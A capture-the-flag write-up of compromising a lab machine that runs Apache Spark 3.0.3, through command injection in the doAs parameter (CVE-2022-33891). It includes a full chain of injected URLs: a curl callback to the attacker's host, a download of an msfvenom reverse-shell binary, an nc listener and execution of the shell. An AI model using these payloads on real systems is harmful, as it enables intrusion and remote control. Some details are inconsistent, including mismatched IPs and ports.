# Spark

# Enumeration
---
### Nmap
#

TCP scan of all ports, including default scripts.

```bash
# Command
nmap -v -sS -sV -sC -T4 -p- -oA bountyhunter-full-tcp 10.129.95.166

# Output
Nmap scan report for 10.129.228.19
Host is up (0.047s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp  open  http    Jetty 9.4.40.v20210413
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty(9.4.40.v20210413)
|_http-favicon: Unknown favicon MD5: EE30B0E9F863992FE3ED62291F62B7E7
|_http-title: Spark Master at spark://spark:7077
8081/tcp  open  http    Jetty 9.4.40.v20210413
|_http-server-header: Jetty(9.4.40.v20210413)
|_http-title: Spark Worker at 10.129.228.19:42861
|_http-favicon: Unknown favicon MD5: FC7C9CFE16AAF8EFC89C90B88B65C54E
| http-methods: 
|   Supported Methods: GET HEAD TRACE OPTIONS
|_  Potentially risky methods: TRACE
42861/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan  9 08:37:30 2025 -- 1 IP address (1 host up) scanned in 42.89 seconds
```

# HTTP (Port 8080)

There are 2 web ports open on the machine, the first of which is port 8080, this is running [Apache Spark](https://spark.apache.org/), an Apache engine for data anlytics. 

![image](https://github.com/user-attachments/assets/ebe7ccb9-23d9-402f-88cb-5b4947416071)

The version of Apache Spark running can be seen in the top left next to the logo, the version in use is 3.0.3. A quick search shows this version is vulnerable to a Command Injection vulnerability, [CVE-2022–33891](https://nvd.nist.gov/vuln/detail/cve-2022-33891). 

I found [this writeup](https://vsociety.medium.com/apache-zero-days-apache-spark-command-injection-vulnerability-cve-2022-33891-2ea436576145) of the vulnerability useful when epxloiting this box. The code in this writeup gives us the clues we need to exploit the vulnerability, the ?doAs parameter on Spark accepts a valid user when passed into the parameter and checks the users membership using a raw Linux command, see code below: 

```php
private def getUnixGroups(username: String): Set[String] = {
val cmdSeq = Seq("bash", "-c", "id -Gn " + username)
// we need to get rid of the trailing "\n" from the result of command execution
Utils.executeAndGetOutput(cmdSeq).stripLineEnd.split(" ").toSet
Utils.executeAndGetOutput(idPath :: "-Gn" :: username :: Nil).stripLineEnd.split(" ").toSet
}}
```
This means if we can find a legitimate user (root, easy!), we can then follow it up with a command of our own which will be executed by chaining commands. 

I got excited and began hammering in some commands that chained common PoCs such as 'id' and 'whoami' however these seemed to fail. After reading the writeup more closely I realised this is Blind Command Injection. So instead fired up a web server on my local machine on port 8081 and then tried to access it from the Apache Spark box. This worked, see command and screenshot below showing the payload in the URL and ht on the web server:

```bash
http://10.129.228.19:8080/?doAs=root;curl%2010.10.14.5:8081
```

![image](https://github.com/user-attachments/assets/38ddeb1f-d845-4c34-8036-4a7607d17250)

Using a sleep command in a PoC such as ';sleep%2020' would have also shown this is working.

From here RCE should be trivial, I created an exploit file using msfvenom:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=80 -f elf -o shell.elf
```

Used the command injection vulnerability to upload the shell and modify it to make it executable in a one liner payload:

```text
# URL With Payload
http://10.129.228.19:8081/?doAs=root;curl%2010.10.14.5:8081/shell.elf%20-o%20./shell.elf;chmod%20777%20shell.elf

# Decoded Command
curl 10.10.14.5:8081/shell.elf -o ./shell.elf;chmod 777 shell.elf
```

Finally I started a listener with nc:

```bash
nc -nlvp 80
```

And used the command injection to run the file:

```bash
http://10.129.228.19:8081/?doAs=root;./shell.elf
```

The shell with proof and flag can be seen below:
![image](https://github.com/user-attachments/assets/ecdbd0fd-939a-4daf-a5e5-edb37fda3a0b)
